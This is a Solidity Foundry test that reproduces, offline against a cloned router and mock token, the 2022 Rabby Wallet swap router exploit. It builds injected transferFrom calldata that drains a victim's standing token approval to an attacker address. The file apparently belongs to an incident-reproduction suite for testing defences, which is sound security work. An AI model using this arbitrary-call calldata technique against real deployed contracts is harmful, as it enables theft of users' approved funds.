// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {RabbySwapRouterClone} from "../fixtures/malicious-calldata/b-incident/RabbySwapRouterClone.sol";

/// @title malicious-calldata tier (b): Rabby Wallet Swap router exploit (2022-10-11, ~$200K).
/// @notice Minimized offline reproduction of the documented mechanism: the in-wallet swap
///         router executed a caller-supplied target + calldata with no validation. The
///         attacker pointed the target at a victim's approved token and supplied
///         transferFrom(victim, attacker, amount); the router ran it as msg.sender and drained
///         the standing approval. See PROVENANCE.md.
contract RabbySwapRouterIncidentTest is Test {
    uint256 constant VICTIM_BALANCE = 90_000e18; // representative, scaled
    address constant VICTIM = address(0x7211);
    address constant ATTACKER = address(0xBAD58);

    function _report(string memory target, bool drained) internal pure {
        string memory verdict = drained ? "VULNERABLE" : "BLOCKED";
        console.log(string.concat("[malicious-calldata] target=", target, " verdict=", verdict));
    }

    function test_rabby_swapRouter_arbitraryCall_drains() public {
        MockERC20 token = new MockERC20();
        RabbySwapRouterClone router = new RabbySwapRouterClone();

        // A user holds funds and grants the swap router an approval (the exploited state).
        token.mint(VICTIM, VICTIM_BALANCE);
        vm.prank(VICTIM);
        token.approve(address(router), type(uint256).max);

        // ATTACK: swap with swapTarget=token, swapCalldata=transferFrom(victim -> attacker).
        bytes memory injected =
            abi.encodeWithSignature("transferFrom(address,address,uint256)", VICTIM, ATTACKER, VICTIM_BALANCE);
        vm.prank(ATTACKER);
        router.swap(address(token), injected);

        bool drained = (token.balanceOf(VICTIM) == 0 && token.balanceOf(ATTACKER) == VICTIM_BALANCE);
        _report("rabby-swaprouter-victim", drained);

        assertTrue(drained, "unvalidated swap-router call should drain the approval");
        assertEq(token.balanceOf(ATTACKER), VICTIM_BALANCE, "attacker drained the victim");
    }
}
